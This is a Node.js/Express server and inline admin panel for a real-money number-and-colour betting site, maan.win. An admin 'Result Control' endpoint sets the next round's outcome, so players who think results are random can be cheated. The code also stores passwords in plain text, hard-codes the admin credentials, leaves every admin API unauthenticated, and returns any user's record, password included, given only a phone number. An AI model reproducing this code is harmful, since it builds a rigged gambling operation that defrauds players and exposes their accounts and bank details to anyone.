const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let db = {
    users: {}, deposits: [], withdrawals: [], bets: [], gameHistory: [], referrals: [],
    manualNextResult: null, manualBigSmall: null,
    settings: { telegram: 'https://t.me/support', announcement: 'Welcome to maan.win!', qrCode: 'https://via.placeholder.com/150' },
    currentPeriod: Number(new Date().toISOString().replace(/[-T:\.Z]/g, '').slice(0, 14)),
    timer: 30
};

const DATA_FILE = path.join(__dirname, 'db.json');
if (fs.existsSync(DATA_FILE)) {
    try {
        const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        db.users = saved.users || {};
        db.deposits = saved.deposits || [];
        db.withdrawals = saved.withdrawals || [];
        db.bets = saved.bets || [];
        db.referrals = saved.referrals || [];
        db.settings = saved.settings || db.settings;
        db.gameHistory = saved.gameHistory || [];
    } catch(e){}
}

function saveData() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify({
            users: db.users, deposits: db.deposits, withdrawals: db.withdrawals,
            bets: db.bets, referrals: db.referrals, settings: db.settings, gameHistory: db.gameHistory
        }));
    } catch(e){}
}

setInterval(() => {
    db.timer--;
    if (db.timer <= 0) {
        db.timer = 30;
        db.currentPeriod++;
        let num = db.manualNextResult !== null ? db.manualNextResult : Math.floor(Math.random() * 10);
        db.manualNextResult = null;
        let bs = num >= 5 ? 'Big' : 'Small';
        if (db.manualBigSmall !== null) { bs = db.manualBigSmall; db.manualBigSmall = null; }
        let col = num === 0 || num === 5 ? 'violet' : num % 2 === 0 ? 'red' : 'green';
        db.gameHistory.unshift({ period: db.currentPeriod - 1, number: num, bigSmall: bs, color: col });
        if (db.gameHistory.length > 50) db.gameHistory.pop();

        db.bets.forEach(b => {
            if (b.period === (db.currentPeriod - 1) && b.status === 'Pending') {
                let win = false;
                let sel = String(b.select).trim().toLowerCase();
                let numStr = String(num);

                if (sel === numStr) win = true;
                else if (sel === 'big' && bs === 'Big') win = true;
                else if (sel === 'small' && bs === 'Small') win = true;
                else if (sel === col) win = true;

                if (win) {
                    b.status = 'Win';
                    if (db.users[b.phone] && !db.users[b.phone].isBlocked) {
                        let mult = 2.0;
                        if (sel === '0' || sel === '9') mult = 10.0;
                        else if (sel >= '1' && sel <= '8') mult = Number(sel) + 1;
                        db.users[b.phone].balance += (b.totalAmount * mult);
                    }
                } else {
                    b.status = 'Loss';
                }
            }
        });
        saveData();
        io.emit('game-result', { gameHistory: db.gameHistory });
    }
    io.emit('timer-update', { timer: db.timer, period: db.currentPeriod });
}, 1000);

app.post('/api/register', (req, res) => {
    const { phone, password, refCode } = req.body;
    if (!phone || phone.length !== 10 || !password) return res.json({ success: false, message: 'Enter valid 10-digit phone & password' });
    if (db.users[phone]) return res.json({ success: false, message: 'Phone already registered!' });
    let gameId = 'MW' + Math.floor(100000 + Math.random() * 900000);
    
    let referredBy = null;
    if (refCode && db.users[refCode]) {
        referredBy = refCode;
        db.referrals.unshift({ id: Date.now(), referrer: refCode, referred: phone, depositAmount: 0, bonusPaid: 0, status: 'Pending Deposit' });
    }

    db.users[phone] = { phone, password, gameId, balance: 0, isBlocked: false, referredBy };
    saveData();
    res.json({ success: true, user: db.users[phone] });
});

app.post('/api/login', (req, res) => {
    const { phone, password } = req.body;
    const user = db.users[phone];
    if (!user) return res.json({ success: false, message: 'Invalid phone or password' });
    if (user.isBlocked) return res.json({ success: false, message: 'Your account is blocked by Admin!' });
    if (user.password === password) res.json({ success: true, user });
    else res.json({ success: false, message: 'Invalid phone or password' });
});

app.post('/api/deposit', (req, res) => {
    const { phone, amount, utr } = req.body;
    if (!amount || !utr) return res.json({ success: false, message: 'Enter amount and UTR' });
    if (Number(amount) < 100) return res.json({ success: false, message: 'Minimum deposit amount is ₹100' });
    db.deposits.unshift({ id: Date.now(), phone, amount: Number(amount), utr, status: 'Pending' });
    saveData();
    res.json({ success: true, message: 'Deposit request submitted successfully' });
});

app.post('/api/withdraw', (req, res) => {
    const { phone, amount, accName, accNo, ifsc, bankName } = req.body;
    const user = db.users[phone];
    if (user && user.isBlocked) return res.json({ success: false, message: 'Account is blocked' });
    if (Number(amount) < 100) return res.json({ success: false, message: 'Minimum withdrawal amount is ₹100' });
    if (!user || user.balance < amount) return res.json({ success: false, message: 'Insufficient balance' });
    if (!accName || !accNo || !ifsc || !bankName) return res.json({ success: false, message: 'Fill all bank details' });
    user.balance -= Number(amount);
    db.withdrawals.unshift({ id: Date.now(), phone, amount: Number(amount), bankDetails: { accName, accNo, ifsc, bankName }, status: 'Pending' });
    saveData();
    res.json({ success: true, message: 'Withdrawal request submitted', newBalance: user.balance });
});

app.get('/api/user-data', (req, res) => {
    const p = req.query.phone;
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.json({ 
        user: db.users[p], 
        deposits: db.deposits.filter(d => d.phone === p), 
        withdrawals: db.withdrawals.filter(w => w.phone === p), 
        bets: db.bets.filter(b => b.phone === p), 
        gameHistory: db.gameHistory, 
        settings: db.settings 
    });
});

app.post('/api/bet', (req, res) => {
    const { phone, select, amount, quantity } = req.body;
    const user = db.users[phone];
    if (user && user.isBlocked) return res.json({ success: false, message: 'Account is blocked!' });
    let total = Number(amount) * Number(quantity);
    if (!user || user.balance < total) return res.json({ success: false, message: 'Insufficient balance' });
    user.balance -= total;
    db.bets.unshift({ id: Date.now(), phone, select, amount: Number(amount), quantity: Number(quantity), totalAmount: total, period: db.currentPeriod, status: 'Pending' });
    saveData();
    res.json({ success: true, message: 'Bet placed successfully', newBalance: user.balance });
});

app.get('/api/admin/data', (req, res) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.json({ 
        onlineCount: Object.keys(db.users).length, 
        totalUsers: Object.keys(db.users).length,
        timer: db.timer,
        period: db.currentPeriod,
        deposits: db.deposits, 
        withdrawals: db.withdrawals, 
        bets: db.bets,
        referrals: db.referrals,
        usersList: Object.values(db.users),
        settings: db.settings
    });
});

app.post('/api/admin/approve', (req, res) => {
    const { type, id } = req.body;
    if (type === 'deposit') {
        let d = db.deposits.find(x => x.id == id);
        if (d && d.status === 'Pending') { 
            d.status = 'Approved'; 
            if (db.users[d.phone]) {
                db.users[d.phone].balance += Number(d.amount); 
                
                let ref = db.referrals.find(r => r.referred === d.phone && r.bonusPaid === 0);
                if (ref) {
                    ref.depositAmount = Number(d.amount);
                    let bonus = Number(d.amount) * 0.10;
                    if (db.users[ref.referrer]) {
                        db.users[ref.referrer].balance += bonus;
                        ref.bonusPaid = bonus;
                        ref.status = '10% Bonus Paid (₹' + bonus + ')';
                    }
                }
            }
        }
    } else if (type === 'withdraw') {
        let w = db.withdrawals.find(x => x.id == id);
        if (w && w.status === 'Pending') w.status = 'Approved';
    }
    saveData();
    res.json({ success: true });
});

app.post('/api/admin/give-ref-bonus', (req, res) => {
    const { id } = req.body;
    let ref = db.referrals.find(r => r.id == id);
    if (ref && ref.bonusPaid === 0) {
        let bonus = ref.depositAmount > 0 ? (ref.depositAmount * 0.10) : 10;
        if (db.users[ref.referrer]) {
            db.users[ref.referrer].balance += bonus;
            ref.bonusPaid = bonus;
            ref.status = 'Manual Bonus Paid (₹' + bonus + ')';
            saveData();
            return res.json({ success: true, message: 'Bonus given successfully!' });
        }
    }
    res.json({ success: false, message: 'Bonus already paid or invalid referral' });
});

app.post('/api/admin/user-action', (req, res) => {
    const { phone, action, newPassword } = req.body;
    let user = db.users[phone];
    if (user) {
        if (action === 'toggleBlock') user.isBlocked = !user.isBlocked;
        else if (action === 'changePass' && newPassword) user.password = newPassword;
        saveData();
        return res.json({ success: true, message: 'User updated successfully' });
    }
    res.json({ success: false, message: 'User not found' });
});

app.post('/api/admin/control', (req, res) => {
    const { nextNum, nextBs } = req.body;
    if(nextNum !== undefined && nextNum !== '') db.manualNextResult = Number(nextNum);
    if(nextBs !== undefined && nextBs !== '') db.manualBigSmall = nextBs;
    res.json({ success: true, message: 'Result controlled successfully' });
});

app.post('/api/admin/notice', (req, res) => {
    const { notice } = req.body;
    if(notice !== undefined) db.settings.announcement = notice;
    saveData();
    res.json({ success: true });
});

app.post('/api/admin/settings', (req, res) => {
    const { telegram, qrCode } = req.body;
    if(telegram) db.settings.telegram = telegram;
    if(qrCode) db.settings.qrCode = qrCode;
    saveData();
    res.json({ success: true });
});

function checkAdminAuth(req, res, next) {
    const auth = req.headers['authorization'];
    if (!auth) {
        res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
        return res.status(401).send('Authentication required.');
    }
    const buf = Buffer.from(auth.split(' ')[1], 'base64').toString('utf8');
    const [user, pass] = buf.split(':');
    if (user === 'Prince' && pass === '6396714538') return next();
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
    return res.status(401).send('Invalid credentials.');
}

app.get('/admin', checkAdminAuth, (req, res) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.send(`<!DOCTYPE html><html><head><title>maan.win Admin</title><meta name="viewport" content="width=device-width,initial-scale=1.0"><style>body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;padding:8px;margin:0;}.box{background:#161b22;padding:10px;margin-bottom:8px;border-radius:8px;border:1px solid #30363d;}h3{color:#58a6ff;margin-top:0;font-size:14px;}table{width:100%;border-collapse:collapse;font-size:9px;margin-top:6px;}th,td{border:1px solid #30363d;padding:4px;text-align:center;}th{color:#f0883e;background:#21262d;}.btn{padding:4px 8px;background:#238636;color:#fff;border:none;cursor:pointer;border-radius:4px;font-size:10px;font-weight:bold;margin:2px;}.btn-c{background:#1f6feb;}.btn-r{background:#da3633;}.inp{width:100%;padding:8px;margin:4px 0;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#fff;font-size:11px;box-sizing:border-box;}.grid{display:grid;grid-template-columns:repeat(5,1fr);gap:4px;margin-top:5px;}</style></head><body>
    <h3 style="color:#f0883e;text-align:center;">maan.win Master Admin</h3>
    <div class="box" style="display:flex;justify-content:space-around;text-align:center;">
        <div><b>Online:</b><br><span id="onUsers" style="color:#00e676;font-size:16px;">0</span></div>
        <div><b>Total Reg:</b><br><span id="totUsers" style="color:#58a6ff;font-size:16px;">0</span></div>
        <div><b>Timer:</b><br><span id="admTimer" style="color:#ffa000;font-size:16px;">--</span></div>
    </div>
    <div class="box">
        <h3>🔍 User History Search Box</h3>
        <input type="text" id="searchPhoneInp" class="inp" placeholder="Enter 10-digit phone number...">
        <button class="btn" style="width:100%;background:#1f6feb;" onclick="searchUserHistory()">Search User History</button>
        <div id="searchResultBox" style="margin-top:8px;font-size:10px;"></div>
    </div>
    <div class="box">
        <h3>🎯 Result Control</h3>
        <div class="grid">
            <button class="btn btn-c" onclick="setNum(0)">0</button><button class="btn btn-c" onclick="setNum(1)">1</button><button class="btn btn-c" onclick="setNum(2)">2</button><button class="btn btn-c" onclick="setNum(3)">3</button><button class="btn btn-c" onclick="setNum(4)">4</button>
            <button class="btn btn-c" onclick="setNum(5)">5</button><button class="btn btn-c" onclick="setNum(6)">6</button><button class="btn btn-c" onclick="setNum(7)">7</button><button class="btn btn-c" onclick="setNum(8)">8</button><button class="btn btn-c" onclick="setNum(9)">9</button>
        </div>
        <div style="display:flex;gap:4px;margin-top:6px;">
            <button class="btn" style="background:#ff9800;flex:1;" onclick="setBs('Big')">Big</button>
            <button class="btn" style="background:#2196f3;flex:1;" onclick="setBs('Small')">Small</button>
        </div>
    </div>
    <div class="box">
        <h3>📢 Notice Manager</h3>
        <input type="text" id="noticeInp" class="inp" placeholder="Enter notice...">
        <button class="btn" style="width:100%;background:#238636;" onclick="saveNotice()">Broadcast</button>
    </div>
    <div class="box">
        <h3>⚙️ Settings & Telegram Link</h3>
        <input type="text" id="tgInp" class="inp" placeholder="Telegram Link">
        <input type="text" id="qrInp" class="inp" placeholder="Deposit QR URL">
        <button class="btn" style="width:100%;background:#238636;" onclick="saveSettings()">Save</button>
    </div>
    <div class="box"><h3>👥 Referrals</h3><table id="reft"></table></div>
    <div class="box"><h3>👤 Users</h3><table id="ut"></table></div>
    <div class="box"><h3>💰 Deposits</h3><table id="dt"></table></div>
    <div class="box"><h3>💸 Withdrawals</h3><table id="wt"></table></div>
    <div class="box"><h3>🎮 Live Bets</h3><table id="bt"></table></div>

    <script>
    let globalData = {};
    function load(){
        fetch('/api/admin/data?t=' + Date.now()).then(r => r.json()).then(d => {
            globalData = d;
            document.getElementById('onUsers').innerText = d.onlineCount || 0;
            document.getElementById('totUsers').innerText = d.totalUsers || 0;
            document.getElementById('admTimer').innerText = '00:' + (d.timer < 10 ? '0' : '') + d.timer;
            if(d.settings){
                if(document.activeElement !== document.getElementById('tgInp')) document.getElementById('tgInp').value = d.settings.telegram || '';
                if(document.activeElement !== document.getElementById('qrInp')) document.getElementById('qrInp').value = d.settings.qrCode || '';
                if(document.activeElement !== document.getElementById('noticeInp')) document.getElementById('noticeInp').value = d.settings.announcement || '';
            }
            let reft = '<tr><th>Referrer</th><th>Referred</th><th>Deposit</th><th>Action</th></tr>';
            (d.referrals||[]).forEach(r => {
                let btn = r.bonusPaid === 0 ? '<button class="btn" onclick="giveBonus('+r.id+')">Give 10%</button>' : 'Paid';
                reft += '<tr><td>'+r.referrer+'</td><td>'+r.referred+'</td><td>₹'+r.depositAmount+'</td><td>'+btn+'</td></tr>';
            });
            document.getElementById('reft').innerHTML = reft || '<tr><td colspan="4">No data</td></tr>';

            let ut = '<tr><th>Phone</th><th>Balance</th><th>Status</th><th>Block</th><th>Pass</th></tr>';
            (d.usersList||[]).forEach(u => {
                let btn = u.isBlocked ? '<button class="btn" onclick="toggleBlock(\\''+u.phone+'\\')">Unblock</button>' : '<button class="btn btn-r" onclick="toggleBlock(\\''+u.phone+'\\')">Block</button>';
                ut += '<tr><td>'+u.phone+'</td><td>₹'+u.balance+'</td><td>'+(u.isBlocked?'Blocked':'Active')+'</td><td>'+btn+'</td><td><button class="btn btn-c" onclick="chPass(\\''+u.phone+'\\')">Change</button></td></tr>';
            });
            document.getElementById('ut').innerHTML = ut || '<tr><td colspan="5">No users</td></tr>';

            let dt = '<tr><th>Phone</th><th>Amt</th><th>UTR</th><th>Action</th></tr>';
            (d.deposits||[]).forEach(x => {
                dt += '<tr><td>'+x.phone+'</td><td>₹'+x.amount+'</td><td>'+x.utr+'</td><td>'+(x.status==='Pending'?'<button class="btn" onclick="ap(\\'deposit\\','+x.id+')">Approve</button>':x.status)+'</td></tr>';
            });
            document.getElementById('dt').innerHTML = dt || '<tr><td colspan="4">No deposits</td></tr>';

            let wt = '<tr><th>Phone</th><th>Amt</th><th>Status</th><th>Action</th></tr>';
            (d.withdrawals||[]).forEach(x => {
                wt += '<tr><td>'+x.phone+'</td><td>₹'+x.amount+'</td><td>'+x.status+'</td><td>'+(x.status==='Pending'?'<button class="btn" onclick="ap(\\'withdraw\\','+x.id+')">Approve</button>':'Done')+'</td></tr>';
            });
            document.getElementById('wt').innerHTML = wt || '<tr><td colspan="4">No withdrawals</td></tr>';

            let bt = '<tr><th>Phone</th><th>Period</th><th>Select</th><th>Amt</th><th>Status</th></tr>';
            (d.bets||[]).slice(0, 20).forEach(x => {
                bt += '<tr><td>'+x.phone+'</td><td>'+x.period+'</td><td>'+x.select+'</td><td>₹'+x.totalAmount+'</td><td>'+x.status+'</td></tr>';
            });
            document.getElementById('bt').innerHTML = bt || '<tr><td colspan="5">No bets</td></tr>';
        }).catch(e=>{});
    }

    function searchUserHistory(){
        let phone = document.getElementById('searchPhoneInp').value.trim();
        let box = document.getElementById('searchResultBox');
        if(!phone || !globalData.usersList) { box.innerHTML = '<span style="color:#f44336">Enter phone</span>'; return; }
        let u = globalData.usersList.find(x => x.phone === phone);
        if(!u) { box.innerHTML = '<span style="color:#f44336">User not found</span>'; return; }
        let userDeps = (globalData.deposits || []).filter(d => d.phone === phone);
        let userWds = (globalData.withdrawals || []).filter(w => w.phone === phone);
        let userBets = (globalData.bets || []).filter(b => b.phone === phone);
        box.innerHTML = '<div style="background:#0d1117;padding:6px;border-radius:4px;border:1px solid #30363d;">Phone: '+u.phone+' | Bal: ₹'+u.balance+'<br>Deps: '+userDeps.length+' | Wds: '+userWds.length+' | Bets: '+userBets.length+'</div>';
    }

    function giveBonus(id){ fetch('/api/admin/give-ref-bonus', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id: id}) }).then(r=>r.json()).then(res=>{ alert(res.message); load(); }); }
    function toggleBlock(p){ fetch('/api/admin/user-action', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p, action: 'toggleBlock'}) }).then(r=>r.json()).then(res=>{ alert(res.message); load(); }); }
    function chPass(p){ let np = prompt('New pass:'); if(np){ fetch('/api/admin/user-action', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p, action: 'changePass', newPassword: np}) }).then(r=>r.json()).then(res=>{ alert('Pass changed!'); load(); }); } }
    function ap(t, id){ fetch('/api/admin/approve', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type: t, id: id}) }).then(r=>r.json()).then(res=>{ alert('Approved!'); load(); }); }
    function setNum(n){ fetch('/api/admin/control', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({nextNum: n}) }).then(r=>r.json()).then(res=>{ alert('Set: ' + n); }); }
    function setBs(bs){ fetch('/api/admin/control', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({nextBs: bs}) }).then(r=>r.json()).then(res=>{ alert('Set: ' + bs); }); }
    function saveNotice(){ fetch('/api/admin/notice', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({notice: document.getElementById('noticeInp').value}) }).then(r=>r.json()).then(res=>{ alert('Notice sent!'); }); }
    function saveSettings(){ fetch('/api/admin/settings', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({telegram: document.getElementById('tgInp').value, qrCode: document.getElementById('qrInp').value}) }).then(r=>r.json()).then(res=>{ alert('Saved!'); }); }

    setInterval(load, 2500);
    load();
    </script></body></html>`);
});

app.use(express.static(path.join(__dirname)));
app.get('*', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => { console.log('Live on ' + PORT); });
